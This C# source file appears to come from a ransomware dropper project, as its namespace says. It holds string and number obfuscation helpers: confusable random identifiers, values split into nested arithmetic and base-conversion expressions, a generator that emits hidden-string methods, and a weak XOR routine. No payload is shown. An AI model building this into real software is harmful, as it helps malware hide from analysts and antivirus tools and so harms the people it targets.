using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace BisquillaRansomwareDropper
{
    public class Teste
    {

        System.Random random = new Random((int)System.DateTime.UtcNow.Ticks);
        char[] nameMatrix = new char[] { '1', '0', 'O', 'l' };

        /// <summary>
        /// Generate Random Function Name
        /// </summary>
        /// <param name="size"></param>
        /// <returns></returns>
        string GenerateRandomFunctionName(int size)
        {
            StringBuilder sb = new StringBuilder();

            sb.Append("_");
            for (int i = 0; i < size; i++)
            {
                sb.Append(nameMatrix[random.Next(0, nameMatrix.Length)]);
            }

            return sb.ToString();
        }

        /// <summary>
        /// Generate Random Byte
        /// </summary>
        byte GenerateRandomByte(int min, int max)
        {
            return (byte)random.Next(min, max);
        }

        /// <summary>
        /// Generate Random Key in Base64
        /// </summary>
        byte[] GenerateRandomKeyInBase64(int size)
        {
            byte[] hResult = new byte[size];
            random.NextBytes(hResult);
            return hResult;
        }

        /// <summary>
        /// Apply OTP Encryption
        /// </summary>
        /// <param name="source">Source Data</param>
        /// <param name="key">Key</param>
        /// <returns></returns>
        byte[] EncryptDecrypt(byte[] source, byte[] key)
        {
            byte[] hResult = new byte[source.Length];

            for (int i = 0; i < source.Length; i++)
            {
                hResult[i] = (byte)(source[i] ^ key[i]);
            }

            return hResult;
        }

        /// <summary>
        /// Decompose String into Char
        /// </summary>
        /// <param name="str"></param>
        /// <returns></returns>
        string DecomposeStringIntoChar(String str)
        {
            StringBuilder hResult = new StringBuilder();

            hResult.Append("(");
            foreach (char item in str)
            {
                int mode = GenerateRandomByte(1, 3);
                switch (mode)
                {
                    case 1:
                        hResult.AppendFormat("((char) {0})+\"\"", DecomposeNumberIntoEquation(item, GenerateRandomByte(3, 8), true));
                        break;

                    default:
                        hResult.AppendFormat("\"{0}\"", item);
                        break;
                }

                hResult.Append("+");
            }
            hResult = hResult.Remove(hResult.Length - 1, 1);
            hResult.Append(")");

            return hResult.ToString();
        }

        /// <summary>
        /// Convert a Number into Other Format
        /// </summary>
        /// <param name="number"></param>
        /// <returns></returns>
        string ConvertNumberIntoOtherFormat(int number)
        {
            int mode = GenerateRandomByte(1, 5);
            int decomposeEquationLevels = GenerateRandomByte(3, 8);

            switch (mode)
            {
                case 1: // Simple String
                    return String.Format("int.Parse({0})", DecomposeStringIntoChar(number.ToString()));

                case 2: // Binary
                     return String.Format("Convert.ToInt32({0}, {1})", DecomposeStringIntoChar(Convert.ToString(number, 2)), DecomposeNumberIntoEquation(2, decomposeEquationLevels, true));

                case 3: // Hex
                    return String.Format("Convert.ToInt32({0}, {1})", DecomposeStringIntoChar(Convert.ToString(number, 16)), DecomposeNumberIntoEquation(16, decomposeEquationLevels, true));

                case 4: // Octal
                    return String.Format("Convert.ToInt32({0}, {1})", DecomposeStringIntoChar(Convert.ToString(number, 8)), DecomposeNumberIntoEquation(8, decomposeEquationLevels, true));

                default:
                    return DecomposeNumberIntoEquation(number, decomposeEquationLevels).ToString();
            }

            
        }

        /// <summary>
        /// Decompose Number into Equation
        /// </summary>
        /// <param name="number">Target Number</param>
        /// <param name="level">Current Level</param>
        /// <param name="doNotDecomposeIntoOtherFormat">Avoid to Decompose into Other Format</param>
        /// <returns>Equation</returns>
        public string DecomposeNumberIntoEquation(int number, int level, bool doNotDecomposeIntoOtherFormat=false)
        {
            if (level <= 1 || number <= 1)
            {
                if (doNotDecomposeIntoOtherFormat)
                {
                    return number.ToString();
                }
                return ConvertNumberIntoOtherFormat(number);
            }

            int mode = GenerateRandomByte(1, 4);
            int currentNumber = number;
            int randomElement = GenerateRandomByte(1, currentNumber - 1);
            String a;
            String b;
            String format;

            switch (mode)
            {
                case 1: // Simple Subtraction
                    currentNumber -= randomElement;
                    a = DecomposeNumberIntoEquation(currentNumber, level - 1, doNotDecomposeIntoOtherFormat);
                    b = DecomposeNumberIntoEquation(randomElement, level - 1, doNotDecomposeIntoOtherFormat);
                    format = "({0}+{1})";
                    break;

                case 2: // Simple Adition
                    currentNumber += randomElement;
                    a = DecomposeNumberIntoEquation(currentNumber, level - 1, doNotDecomposeIntoOtherFormat);
                    b = DecomposeNumberIntoEquation(randomElement, level - 1, doNotDecomposeIntoOtherFormat);
                    format = "({0}-{1})";
                    break;

                case 3: // XOR
                    currentNumber ^= randomElement;
                    a = DecomposeNumberIntoEquation(currentNumber, level - 1, doNotDecomposeIntoOtherFormat);
                    b = DecomposeNumberIntoEquation(randomElement, level - 1, doNotDecomposeIntoOtherFormat);
                    format = "({0}^{1})";
                    break;

                default:
                    throw new NotImplementedException();
            }

            return String.Format(format, a, b);
        }

        /// <summary>
        /// Obfuscate String
        /// </summary>
        /// <param name="input"></param>
        /// <returns></returns>
        public string ObfuscateString(String input, String functionName)
        {
            StringBuilder sb = new StringBuilder();

            sb.Append("static string " + functionName + "() {");
            sb.Append("return new String(new char[] { ");

            foreach (char item in input)
            {
                sb.AppendFormat("(char) {0},", DecomposeNumberIntoEquation(item, 2));
            }

            sb.Append("});");
            sb.Append("}");

            return sb.ToString();
        }

    }
}
